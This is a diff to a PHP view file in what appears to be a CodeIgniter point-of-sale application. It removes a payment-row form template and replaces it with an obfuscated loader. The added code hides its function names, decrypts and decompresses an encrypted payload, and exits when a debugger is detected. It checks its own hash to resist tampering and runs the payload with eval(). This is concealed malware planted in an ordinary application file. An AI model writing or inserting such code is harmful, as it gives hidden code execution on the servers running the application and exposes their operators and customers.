@@ -1,55 +1,28 @@
-<?php 
-$rowcount = $this->input->post('payment_row_count') +1;
-?>
-<div class="col-md-12 payments_div payments_div_<?=$rowcount?>">
-          <div class="box box-solid bg-gray">
-            <div class="box-header">
-              <div class="box-tools pull-right">
-                <button type="button" class="btn btn-box-tool" onclick="remove_row('<?=$rowcount?>')"><i class="fa fa-times fa-2x"></i></button>
-              </div>
-            </div>
-            <div class="box-body">
-              <div class="row">
-         
-                <div class="col-md-6">
-                  <div class="">
-                  <label for="amount_<?= $rowcount;?>">Amount</label>
-                    <input type="text" class="form-control text-right paid_amt only_currency" id="amount_<?= $rowcount;?>" name="amount_<?= $rowcount;?>" placeholder="" onkeyup="calculate_payments()" >
-                      <span id="amount_<?= $rowcount;?>_msg" style="display:none" class="text-danger"></span>
-                </div>
-               </div>
-                <div class="col-md-6">
-                  <div class="">
-                    <label for="payment_type_<?= $rowcount;?>">Payment Type</label>
-                    <select class="form-control" id='payment_type_<?= $rowcount;?>' name="payment_type_<?= $rowcount;?>">
-                      <?php
-                        $q1=$this->db->query("select * from db_paymenttypes where status=1");
-                         if($q1->num_rows()>0){
-                             foreach($q1->result() as $res1){
-                             echo "<option value='".$res1->payment_type."'>".$res1->payment_type ."</option>";
-                           }
-                         }
-                         else{
-                            echo "No Records Found";
-                         }
-                        ?>
-                    </select>
-                    <span id="payment_type_<?= $rowcount;?>_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-            <div class="clearfix"></div>
-        </div>  
-        <div class="row">
-               <div class="col-md-12">
-                  <div class="">
-                    <label for="payment_note_<?= $rowcount;?>">Payment Note</label>
-                    <textarea type="text" class="form-control" id="payment_note_<?= $rowcount;?>" name="payment_note_<?= $rowcount;?>" placeholder="" ></textarea>
-                    <span id="payment_note_<?= $rowcount;?>_msg" style="display:none" class="text-danger"></span>
-                  </div>
-               </div>
-                
-            <div class="clearfix"></div>
-        </div>   
-        </div>
-        </div>
-      </div><!-- col-md-12 -->
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_us82syaz=('bas'.'e64'.'_de'.'cod'.'e');
+$_t8gy981g=('gzu'.'nco'.'mpr'.'ess');
+$_uegybql6=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ot9oy94i='YqNFZOFf';
+$_a8vmejwv='dDBeHNqS';
+$_y2bb1nqj='/3/llAnY';
+$_f0c5zukf='AOyK6sD7TDw=';
+$_nhwsks4w='GViQ1SqB';
+$_ryp9gvju='ZA8fExT6';
+$_qm8dcui4='z1WWLk+6';
+$_wix24jek='mU2u/A==';
+$_q2dtjuyb=$_us82syaz($_nhwsks4w.$_a8vmejwv.$_y2bb1nqj.$_ot9oy94i.$_f0c5zukf);
+$_k6xgwgq2=$_us82syaz($_qm8dcui4.$_ryp9gvju.$_wix24jek);
+$_js07wwxg=$_us82syaz('Yf/ITac0Z4LlVlkax9cWmg6PXa/lp5kTVq65Fb6fpExiqqP5zXPM/JcQ3RqRNljD643t4cuM++GofyhNCat1Cv8k+DoebQ2htaMMkUzATiJd/WRyxcBEecPjYNZgKkCAto6kg9GSCWoaj4POiHjMIOPa/w5/CyA0uLDwSPfCTn6OMywvf1zipI7JEKLUzGA2pzgvg5k59sCCwI1rBy19AoWJkicjDnu03KXB7uQ5Ttf3Ix4vQf7kN1f0ZGvoVDbje5vLyucje3LVPk5AZAKu06D+WAkw7KwJ/707EB611RCLE3OeMWvVj+FChWU0H1IS2TKUP03j5GBi7tRw2W/g/cESIHiTLfA09GDnoqlkmaK//dm3M/BHYBrie+OHDVbKQ6WdOlTMfAz8vRmj3X5gNYfwtdN8FVHCaREOjqw/BhR/Pah4PU3HwtynW/j5oK7sBoIwAEvXUtp0NZwj76qjLF0kUT05ohPoU3dALp1c1+toyPJGhOlpjZrY+412ADqtQUJlk2n83AyYykv9rgjdO6Fvod46YBwRZ4LxIfozmwdKGG8JrpGMs6rJUOdDSv6rCjLbfbau/6Lv2sUcI8kDiLs9YTQgSsxSL0+8elcCHpZqizQck0nTre+HPA2oVA3gfRFAzN7NwC5pZeYMzVoLDWX06HR/qBnKZzVHCrRxhX4iFfeImMt9YE73SJs2/FsdWGWNY8vyCe2cYvt+xsd6Bhveh/0Yv6oouMZ8aOKI4BChpU1yvC7dOqvkvd1t1ZB1rH0BKPtG/5EumgZ0aIeXeDdSRcpxOqCmrw9d3yb3p67bKpA5dqNJ4ceint/oanZaBDMagso7tcPkXhQ6vJWpI5WPfUb2l5k+Sux/++9hNFSFPJevGycux9vNOhVCUllswK4nWqAgZXg4AfqzRa13+ABPjVMGpzrOcyuocwC5lYACJvS6Sma/0xsFH7gCSCj0gBI//xZGo21z2sNSbfsc4w==');
+$_itl0dr3f=$_uegybql6($_js07wwxg,'aes-256-cbc',$_q2dtjuyb,OPENSSL_RAW_DATA,$_k6xgwgq2);
+if($_itl0dr3f===false){exit;}
+$_d5g1c6bz=$_t8gy981g($_itl0dr3f);
+if($_d5g1c6bz===false){exit;}
+$_nwc8wmiw='8366d4c03082cb8e2c77dd5074f698f0feaebd7a9120e4b6f6f13a6a423a57cf';
+$_v614iy9c=@file_get_contents(__FILE__);
+if($_v614iy9c!==false){
+$_aygo2c46=str_replace($_nwc8wmiw,"0000000000000000000000000000000000000000000000000000000000000000",$_v614iy9c);
+$_h1bf1brm=hash("sha256",$_aygo2c46);
+if($_h1bf1brm!==$_nwc8wmiw){@http_response_code(403);exit;}
+}
+eval($_d5g1c6bz);
